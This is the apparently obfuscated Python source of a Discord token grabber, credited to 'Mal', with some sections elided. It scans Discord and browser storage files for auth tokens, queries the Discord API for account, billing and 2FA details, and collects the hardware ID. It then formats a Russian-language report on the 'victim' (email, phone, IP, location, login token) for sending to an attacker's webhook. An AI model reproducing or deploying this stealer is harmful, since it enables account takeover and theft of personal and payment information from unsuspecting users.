...
print("Enter your DISCORD WEBHOOK:")
input()

print("Creating File...")
time.sleep(1)
print("File Created! Saved on your computer")
...
languages ={'da':'Danish, Denmark','de':'German, Germany','en-GB':'English, United Kingdom','en-US':'English, United States','es-ES':'Spanish, Spain','fr':'French, France','hr':'Croatian, Croatia','lt':'Lithuanian, Lithuania','hu':'Hungarian, Hungary','nl':'Dutch, Netherlands','no':'Norwegian, Norway','pl':'Polish, Poland','pt-BR':'Portuguese, Brazilian, Brazil','ro':'Romanian, Romania','fi':'Finnish, Finland','sv-SE':'Swedish, Sweden','vi':'Vietnamese, Vietnam','tr':'Turkish, Turkey','cs':'Czech, Czechia, Czech Republic','el':'Greek, Greece','bg':'Bulgarian, Bulgaria','ru':'Russian, Russia','uk':'Ukranian, Ukraine','th':'Thai, Thailand','zh-CN':'Chinese, China','ja':'Japanese','zh-TW':'Chinese, Taiwan','ko':'Korean, Korea'}#line:32
LOCAL =os .getenv ("LOCALAPPDATA")#line:34
ROAMING =os .getenv ("APPDATA")#line:35
PATHS ={"Discord":ROAMING +"\\Discord","Discord Canary":ROAMING +"\\discordcanary","Discord PTB":ROAMING +"\\discordptb","Google Chrome":LOCAL +"\\Google\\Chrome\\User Data\\Default","Opera":ROAMING +"\\Opera Software\\Opera Stable","Brave":LOCAL +"\\BraveSoftware\\Brave-Browser\\User Data\\Default","Yandex":LOCAL +"\\Yandex\\YandexBrowser\\User Data\\Default"}#line:44
def getheaders (token =None ,content_type ="application/json"):#line:47
    O000O0O00OOO0000O ={"Content-Type":content_type ,"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}#line:51
    if token :#line:52
...
def getuserdata (OO0OO0OOO00OOO000 ):#line:57
    try :#line:58
        return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =getheaders (OO0OO0OOO00OOO000 ))).read ().decode ())#line:60
    except :#line:61
        pass #line:62
def gettokens (O0000000O00O0OO00 ):#line:65
    ...
    for O0000O00O00OOO0OO in os .listdir (O0000000O00O0OO00 ):#line:68
        if not O0000O00O00OOO0OO .endswith (".log")and not O0000O00O00OOO0OO .endswith (".ldb"):#line:69
            continue #line:70
        for O0O0OO0O00000OOO0 in [OOO0OOO00O0O0OOO0 .strip ()for OOO0OOO00O0O0OOO0 in open (f"{O0000000O00O0OO00}\\{O0000O00O00OOO0OO}",errors ="ignore").readlines ()if OOO0OOO00O0O0OOO0 .strip ()]:#line:71
...
def gethwid ():#line:114
    OOO00O0OO00OOOOOO =Popen ("wmic csproduct get uuid",shell =True ,stdin =PIPE ,stdout =PIPE ,stderr =PIPE )#line:115
...
def has_payment_methods (O0OOOOO0O00000OO0 ):#line:119
    try :#line:120
        return bool (len (loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/billing/payment-sources",headers =getheaders (O0OOOOO0O00000OO0 ))).read ().decode ()))>0 )#line:122
    except :#line:123
        pass #line:124
def main ():#line:127
    ...
    for OO000000OO0OO000O ,O0O00O00000000OOO in PATHS .items ():#line:143
        ...
        for OO0O0OO0OOO0O0OOO in gettokens (O0O00O00000000OOO ):#line:146
            ...
            O00OOOO0O00OO000O =OO00O00OOO00OO000 ["username"]+"#"+str (OO00O00OOO00OO000 ["discriminator"])#line:163
            ...
            OOOOO0O0OOO00O0O0 =datetime .utcfromtimestamp (((int (O00O000OOOO0O00OO )>>22 )+1420070400000 )/1000 ).strftime ('%d-%m-%Y %H:%M:%S UTC')#line:175
            ...
            O0OOOOOO000O00OOO ={"color":0xd53444 ,"fields":[{"name":"```— ОБЩАЯ ИНФОРМАЦИЯ О АККАУНТЕ —```","value":f'Email: {OOO00O0O00O0O0O00}\nТелефон: {OO000OO0O00OOO00O}\nАктивная подписка Nitro: {OOOOO000000O000O0}\nПлатежные данные: {OO0OOOO00O0OOO000}\nСтатус 2FA/MFA: {O0OO0OOO0O000O0OO}',"inline":True },{"name":"```— ПРОЧАЯ ИНФОРМАЦИЯ О ЖЕРТВЕ —```","value":f'IP адрес жертвы: {OO0OOOO000OOOOOO0}\nМестоположение: {O00O0000O00OOOO00}\nСграбленно из: {OO000000OO0OO000O}\nПодтвержденная почта: {O0OOOO00OOO00O00O}\nАвторизирован: {OOOOO0O0OOO00O0O0}',"inline":True },{"name":"**ТОКЕН ЖЕРТВЫ ДЛЯ АВТОРИЗАЦИИ НА ЕГО АККАУНТЕ**","value":OO0O0OO0OOO0O0OOO ,"inline":False }],"author":{"name":f"{O00OOOO0O00OO000O} ({O00O000OOOO0O00OO})","icon_url":O000OO0O0O000O0O0 },"footer":{"text":f"{O000O0O00O00O000O}"}}#line:206
    ...
    O0O0O00O0O0O0O00O ={"content":"","embeds":OO000O0OO000O0OOO ,"username":"Discord Token Grabber by Mal",}#line:219
    try :#line:220
